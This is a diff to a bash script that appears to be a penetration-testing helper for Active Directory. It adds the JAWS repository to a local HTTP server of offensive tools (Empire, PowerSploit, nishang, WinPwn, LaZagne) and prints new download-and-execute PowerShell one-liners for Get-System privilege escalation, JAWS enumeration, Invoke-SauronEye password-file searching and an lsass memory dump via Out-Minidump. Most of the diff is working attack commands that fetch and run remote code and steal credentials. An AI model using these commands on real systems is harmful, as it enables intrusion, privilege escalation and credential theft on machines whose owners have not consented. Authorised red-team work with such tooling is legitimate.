@@ -29,7 +29,10 @@ PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSy
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
-SecListsRepo="https://github.com/danielmiessler/SecLists.git";
+SecListsRepo="https://github.com/danielmiessler/SecLists";
+JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master";
+
+
 
 LocalRepo="False"
 
@@ -98,6 +101,8 @@ EmpireLocalRepo="$HOME/ADAT/Empire"
 NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
 WinPwnLocalRepo="$HOME/ADAT/WinPwn"
+JAWSLocalRepo="$HOME/ADAT/JAWS"
+
 
 if [ -d "$EmpireLocalRepo" ] 
 then
@@ -158,11 +163,26 @@ else
 	echo -e ""
 fi
 
+if [ -d "$JAWSLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "JAWS is installed, checking if updated to latest version."
+    	cd $JAWSLocalRepo
+    	git pull "https://github.com/411Hall/JAWS.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning JAWS Repo${RESTORE}"
+	git clone --recursive "https://github.com/411Hall/JAWS.git" $HOME/ADAT/JAWS
+	echo -e ""
+fi
+
 
 cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
@@ -233,6 +253,7 @@ while [ $# -gt 0 ]; do
 		LazagneRepo="http://$LocalIP:$LocalPort/"
 		PowerSploitRepo="http://$LocalIP:$LocalPort/"
 		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
+		JAWSRepo="http://$LocalIP:$LocalPort/"
 		LocalRepo="True"
 		Function_LocalRepo;
                 shift
@@ -708,6 +729,9 @@ echo -e ""
 echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
 echo -e ""
+echo -e "${IBLUE}Get-System${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
+echo -e ""
 
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "										${LGREEN} Enumeration ${RESTORE}"
@@ -726,6 +750,8 @@ echo -e ""
 echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
 echo -e ""
+echo -e "${IBLUE}JAWS${RESTORE}"
+echo -e "$DownloadMethod "$JAWSRepo"/blob/master/jaws-enum.ps1);JAWS-ENUM"
 echo -e ""
 echo -e ""
 # Network Enumeration
@@ -749,6 +775,12 @@ echo -e "${LRED}┌────────────────────�
 echo -e "" 
 echo -e "${IBLUE}Get-ClipboardContents${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"collection/Get-ClipboardContents.ps1);Get-ClipboardContents"
+echo -e ""
+echo -e "${IBLUE}Invoke-SauronEye${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"collection/Invoke-SauronEye.ps1);Invoke-SauronEye -keywords pass"
+echo -e ""
+echo -e "${IBLUE}Out-Minidump${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"collection/Out-Minidump.ps1);Get-Process lsass | Out-Minidump"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 
